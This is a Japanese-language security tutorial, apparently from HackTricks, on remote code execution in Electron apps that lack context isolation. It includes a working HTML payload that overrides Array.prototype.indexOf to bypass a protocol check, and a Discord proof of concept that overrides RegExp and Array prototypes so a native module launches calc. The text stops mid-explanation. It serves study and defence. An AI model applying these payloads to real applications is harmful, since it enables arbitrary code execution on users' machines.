# Electron contextIsolation RCE via preload code

{{#include ../../../banners/hacktricks-training.md}}

## Example 1

Example from [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)

このコードはデフォルトのブラウザでhttp(s)リンクを開きます：

![](<../../../images/image (768).png>)

`file:///C:/Windows/systemd32/calc.exe`のようなものを使用してcalcを実行することができますが、`SAFE_PROTOCOLS.indexOf`がそれを防いでいます。

したがって、攻撃者はXSSまたは任意のページナビゲーションを介してこのJSコードを注入することができます：
```html
<script>
Array.prototype.indexOf = function () {
return 1337
}
</script>
```
`SAFE_PROTOCOLS.indexOf`を呼び出すと常に1337が返されるため、攻撃者は保護を回避し、calcを実行できます。最終的なエクスプロイト:
```html
<script>
Array.prototype.indexOf = function () {
return 1337
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
オリジナルのスライドを確認して、許可を求めるプロンプトなしでプログラムを実行する他の方法を探してください。

どうやら、コードをロードして実行する別の方法は、`file://127.0.0.1/electron/rce.jar`のようなものにアクセスすることです。

## 例 2: Discord アプリ RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)からの例

プリロードスクリプトを確認したところ、Discordは、許可されたモジュールのいくつかを`DiscordNative.nativeModules.requireModule('MODULE-NAME')`を介してウェブページに呼び出すことを可能にする関数を公開しています。\
ここでは、_child_process_モジュールのようなRCEに直接使用できるモジュールを使用することはできませんでしたが、**JavaScriptの組み込みメソッドをオーバーライドすることによってRCEを達成できるコードを見つけました**。公開されたモジュールの実行に干渉します。

以下はPoCです。**`RegExp.prototype.test`と`Array.prototype.join`をオーバーライドしながら、devToolsから"_discord_utils_"というモジュールで定義された`getGPUDriverVersions`関数を呼び出すと、**calc**アプリケーションが**ポップアップすることを確認できました。**
```javascript
RegExp.prototype.test = function () {
return false
}
Array.prototype.join = function () {
return "calc"
}
DiscordNative.nativeModules
.requireModule("discord_utils")
.getGPUDriverVersions()
```
`getGPUDriverVersions` 関数は、次のように "_execa_" ライブラリを使用してプログラムを実行しようとします:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== "win32") {
return {}
}

const result = {}
const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
} catch (e) {
result.nvidia = { error: e.toString() }
}

return result
}
```
通常、_execa_は`nvidiaSmiPath`変数に指定された"_nvidia-smi.exe_"を実行しようとしますが、オーバーライドされた`RegExp.prototype.test`と`Array.prototype.join`のために、**引数は\_execa**\_**の内部処理で"**_**calc**_**"に置き換えられます**。

具体的には、引数は以下の2つの部分を変更することで置き換えられます。
